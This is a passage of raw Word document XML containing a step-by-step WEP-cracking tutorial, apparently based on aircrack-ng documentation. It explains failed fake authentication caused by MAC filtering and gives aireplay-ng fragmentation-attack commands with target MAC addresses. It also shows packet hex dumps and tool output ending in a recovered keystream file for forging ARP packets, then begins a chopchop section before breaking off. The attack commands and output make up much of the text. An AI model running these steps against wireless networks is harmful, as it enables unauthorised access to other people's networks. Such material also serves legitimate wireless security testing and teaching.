    <w:p w14:paraId="0BB40AD6" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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15107588" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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 access points are configured to only allow selected MAC addresses to associate and connect. If this is the case, you will not be able to successfully do fake authentication unless you know one of the MAC addresses on the allowed list. See the MAC access </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>control troubleshooting</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> tip </w:t>
      </w:r>
      <w:hyperlink r:id="rId6" w:anchor="troubleshooting_tips" w:history="1">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="107902"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3379A851" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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at any time you wish to confirm you are properly associated is to use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and look at the packets. Start another session and…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3AF0F5"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Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="393AD66C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2140CAE6"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB48EFA" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="002A541E" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22DDFA3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Here is a typical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error message you are looking for:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D4F150"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11:04:34.360700 314us BSSID:00:14:6c</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:7e:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> DA:00:09:5B:EC:EE:F2 SA:00:14:6c:7e:40:80   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DeAuthentication</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: Class 3 frame received from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>nonassociated</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> station</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C3A6207" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46CF89D3"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Notice that the access point (00:14:6c</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:7e:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>) is telling the source (00:09:5B:EC:EE:F2) you are not associated. Meaning, the AP will not process or accept the injected packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E730F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want to select only the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DeAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packets with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then you can use: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4ED20C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CDCC710" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="003112DC" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>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 | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>grep</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DeAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1CCD8D34" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14AEB5F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may need to tweak the phrase “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DeAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>” to pick out the exact packets you want.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D86C548" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="064B0FC2"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**USE THE BELOW ATTACKS IF FAKE AUTH FAILS**</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A84C96"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3 -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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>chopchop</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fragmenation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack to obtain PRGA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B8ED86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run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7211C7CE" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="0070331F" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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FRAG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2B0D7E"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-5 -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B164BB" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00EA0EF7" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D721820"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0D145454"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-5 means the fragmentation attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF3BFAE"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250D53A6"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0B4ECE31"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6948DAD5"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2AFFFD97" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39B0460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Waiting for a data packet...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7B288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Read 127 packets...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21CF70E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2E2C2DC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Size: 114,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6FE52AE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45AB79D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5E6E279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01:00:5E:00:00:FB</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="42F28B3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6DD3033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532F06B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0x0000:  0842 0000 0100 5e00 00fb 0014 6c7e 4080  .B</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.....l~@.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E22252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0x0010:  0040 f477 e5c9 6052 8c00 0000 3073 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>d265  .@.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..`R</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>....0s.e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0EF80E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0x0020:  c402 790b 2293 c7d5 89c5 4136 7283 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>29df  ..y</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A6r.).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D47993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0x0030:  4e9e 5e13 5f43 4ff5 1b37 3ff9 4da4 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>c03b  N</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.^._CO..7</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M</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1ECDEFBC"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0x0040:  8244 5882 d5cc 7a1f 2b9b 3ef0 ee0f 4fb5  .DX...z</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.&gt;...O.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D72B27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0x0050:  4563 906d 0d90 88c4 5532 a602 a8ea </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">f8e2  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Ec.m</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>....U2......</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1435A81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0x0060:  c531 e214 2b28 fc19 b9a8 226d 9c71 6ab1  .1</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.qj</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="697F70C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0x0070:  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>9c9f                                     ..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="591628A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42228EDF" w14:textId="77777777" w:rsidR="00EB60F0"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42CFD2A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9D25CF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When a packet from the access point arrives, enter “y” to proceed. You may need to try a few different packets from the AP to be successful. These packets have ”“</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>FromDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>: 1”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56453DF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When successful, the system responds:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3966ABC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Saving chosen packet in replay_src-0203-180328.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D7FD7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Data packet found!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23232C0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Sending fragmented packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175CB6B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5AD9C6A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6FA77F8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Trying to get 384 bytes of a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>keystream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="07D5914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273416A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1456032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Trying to get 1500 bytes of a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>keystream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="42C393A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64047F7A"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1B9B574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fragment-0203-180343.xor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3170A845" w14:textId="77777777" w:rsidR="00EB60F0"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Now you can build a packet with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>packetforge-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> out of that 1500 bytes </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>keystream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="49F4389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92C6E79" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7896DB77" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="002463D1" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Success! The file “fragment-0203-180343.xor” can then be used in the next step</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002463D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">to generate an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002463D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002463D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6E5752" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A18BEA0"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the fragmentation attack was not successful, you can then try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technique next. Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2255F82A" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="571E166F" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="0070331F" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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CHOPCHOP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="384F7C7D" w14:textId="77777777" w:rsidR="00EB60F0"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F37B2B">
        <w:rPr>
